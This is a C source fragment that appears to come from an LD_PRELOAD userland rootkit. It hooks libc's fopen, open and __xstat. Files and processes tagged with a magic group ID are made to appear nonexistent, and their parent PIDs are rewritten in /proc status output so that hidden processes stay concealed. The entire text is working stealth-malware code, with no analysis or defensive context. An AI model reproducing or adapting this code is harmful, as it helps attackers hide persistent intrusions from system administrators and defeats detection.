#define O_RDONLY 0x0000
FILE *procstatus (const char *filename) {
  char line[LINE_MAX], newline[LINE_MAX];
  char bullshit[6], parent[20];
  char *dpath;
  int ppid;
  struct stat s_fstat, s_fstat2, s_fstat3;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_fopen) old_fopen = dlsym (libc, "fopen");
  if (!old_xstat) old_xstat = dlsym(libc, "__xstat");
  if(!strcmp(get_my_procname(), "ps")) return old_fopen(filename,"rb");;
  if(!strcmp(get_my_procname(), "/bin/ps")) return old_fopen(filename,"rb");
  dpath = getpath(filename);
  if (old_xstat(_STAT_VER,filename,&s_fstat2) != 0) { errno = ENOENT; return NULL; }
  if (old_xstat(_STAT_VER,dpath,&s_fstat3) != 0) { errno = ENOENT; return NULL; }
  if(s_fstat2.st_gid == MAGIC_GID && getgid() != MAGIC_GID) { errno = ENOENT; return NULL; }
  if(s_fstat3.st_gid == MAGIC_GID && getgid() != MAGIC_GID) { errno = ENOENT; return NULL; }
  FILE *tmp = tmpfile();
  FILE *pnt = old_fopen (filename, "rb");
  if(pnt == NULL) { errno=ENOENT; return NULL; }
  if(tmp == NULL) { errno = ENOENT; return pnt; } // fuuuuckkkk.... i guess this is better than CRASHING
  while (fgets (line, LINE_MAX, pnt) != NULL) {
    if(strstr(line,"PPid:")) {
      sscanf(line,"%5s\x09%d", bullshit, &ppid);
      snprintf(parent, 19, "/proc/%d", ppid);
      old_xstat(_STAT_VER, parent, &s_fstat);
      if(s_fstat.st_gid == MAGIC_GID) ppid = 1;
      snprintf(newline,LINE_MAX-1,"%s\x09%d\n", bullshit, ppid);
      fputs(newline,tmp);
    }
    else fputs(line,tmp);
  }
//  fclose (pnt);
  if(tmp != NULL) fseek (tmp, 0, SEEK_SET);
  if(tmp != NULL) return tmp;
  return pnt;
}
int procstatus_o (const char *filename) {
  char line[LINE_MAX], newline[LINE_MAX];
  char bullshit[6], parent[20];
  char *dpath;
  int ppid;
  struct stat s_fstat, s_fstat2, s_fstat3;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_fopen) old_fopen = dlsym (libc, "fopen");
  if (!old_open) old_open = dlsym (libc, "open");
  if (!old_xstat) old_xstat = dlsym(libc, "__xstat");
  if(!strcmp(get_my_procname(), "ps")) return old_open(filename,O_RDONLY,0755);
  if(!strcmp(get_my_procname(), "/bin/ps")) return old_open(filename,O_RDONLY,0755);
  dpath = getpath(filename);
  if (old_xstat(_STAT_VER,dpath,&s_fstat3) != 0) { errno = ENOENT; return -1; }
  if (old_xstat(_STAT_VER,filename,&s_fstat2) != 0) { errno = ENOENT; return -1; }
  if(s_fstat2.st_gid == MAGIC_GID && getgid() != MAGIC_GID) { errno = ENOENT; return -1; }
  if(s_fstat3.st_gid == MAGIC_GID && getgid() != MAGIC_GID) { errno = ENOENT; return -1; }
  FILE *tmp = tmpfile();
  FILE *pnt = old_fopen (filename, "rb");
  if(pnt == NULL) { errno=ENOENT; return -1; }
  if(tmp == NULL) { errno = ENOENT; return fileno(pnt); } // fuuuuckkkk.... i guess this is better than CRASHING
  while (fgets (line, LINE_MAX, pnt) != NULL) {
    if(strstr(line,"PPid:")) {
      sscanf(line,"%5s\x09%d", bullshit, &ppid);
      snprintf(parent, 19, "/proc/%d", ppid);
      old_xstat(_STAT_VER, parent, &s_fstat);
      if(s_fstat.st_gid == MAGIC_GID) ppid = 1;
      snprintf(newline,LINE_MAX-1,"%s\x09%d\n", bullshit, ppid);
      fputs(newline,tmp);
    }
    else fputs(line,tmp);
  }
//  fclose (pnt);
  if(tmp != NULL) fseek (tmp, 0, SEEK_SET);
  if(tmp != NULL) return fileno(tmp);
  return fileno(pnt);
}
